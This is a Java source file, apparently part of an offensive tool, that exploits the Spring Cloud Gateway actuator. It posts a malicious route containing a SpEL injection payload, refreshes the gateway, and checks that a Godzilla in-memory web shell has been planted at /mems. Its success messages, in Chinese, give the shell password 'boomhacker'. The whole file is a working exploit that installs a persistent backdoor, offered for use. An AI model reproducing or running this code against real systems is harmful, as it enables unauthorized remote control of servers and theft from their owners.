package src.main.Exp.ExpCore;

import src.main.MemshellLoad.MemshellLoad;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

public class ExpCore {
    String address;
    public ExpCore(String address){
        this.address = address;
    }
    public Stream<String> ShellGaw() throws IOException {
        Stream.Builder<String> builder = Stream.builder();
        String res = "";
        String data =
                "{\n" +
                        "  \"id\": \"pwnshell\",\n" +
                        "  \"filters\": [{\n" +
                        "    \"name\": \"AddResponseHeader\",\n" +
                        "    \"args\": {\n" +
                        "      \"name\": \"Result\",\n" +
                        "      \"value\": \"#{T(org.springframework.cglib.core.ReflectUtils).defineClass(\\\"GMemShell\\\",T(org.springframework.util.Base64Utils).decodeFromString('%s'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping, '/mems')}\"\n" +
                        "    }\n" +
                        "  }],\n" +
                        "  \"uri\": \"http://example.com\"\n" +
                        "}";
        MemshellLoad ms = new MemshellLoad();
        String shell = ms.run();
        String shellData = String.format(data,shell);
        String api = "/actuator/gateway/routes/pwnshell";
        String refapi = "/actuator/gateway/refresh";
        String site = address + api;
        URL urlobj = new URL(site);
        HttpURLConnection conn = (HttpURLConnection) urlobj.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        try (OutputStream os = conn.getOutputStream()) {
            byte[] input = shellData.getBytes("utf-8");
            os.write(input, 0, input.length);
        }
        int responseCode = conn.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_CREATED){
            String site1 = address + refapi;
            URL urlobj1 = new URL(site1);
            HttpURLConnection conn1 = (HttpURLConnection) urlobj1.openConnection();
            conn1.setRequestMethod("POST");
            conn1.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
            conn1.setDoOutput(true);
            int responseCode1 = conn1.getResponseCode();
            if (responseCode1 == HttpURLConnection.HTTP_OK){
                URL urlobj2 = new URL(site);
                HttpURLConnection conn2 = (HttpURLConnection) urlobj2.openConnection();
                conn2.setRequestMethod("GET");
                conn2.setDoOutput(true);
                BufferedReader in = new BufferedReader(new InputStreamReader(conn2.getInputStream()));
                String inputLine;
                StringBuilder content = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    content.append(inputLine);
                    res = inputLine.toString();
                }
                int responseCode2 = conn2.getResponseCode();
                if (responseCode2 == HttpURLConnection.HTTP_OK){
                    if (res.contains("pwnshell")) {
                        String resultPattern = "Result\\s*=\\s*'([^\\n]*)'";
                        Pattern pattern = Pattern.compile(resultPattern);
                        Matcher matcher = pattern.matcher(content.toString());
                        if (matcher.find()) {
                            System.out.println(matcher.group(1));
                            if(matcher.group(1).equals("ok")) {
                                String result = "哥斯拉GetShell成功，访问地址为/mems， 密码为boomhacker";
                                builder.add(result);
                            }else{
                                String result = "已经上传过了，请不要重新上传了\t\t访问地址为/mems， 密码为boomhacker";
                                builder.add(result);
                            }
                        }
                    }else {
                        builder.add(address + "   " + "Getshell失败，请重试");
                    }
                }else{
                    builder.add("POST request failed with response code: " + responseCode1);
                }
            }
        }
        return builder.build();
    }
}
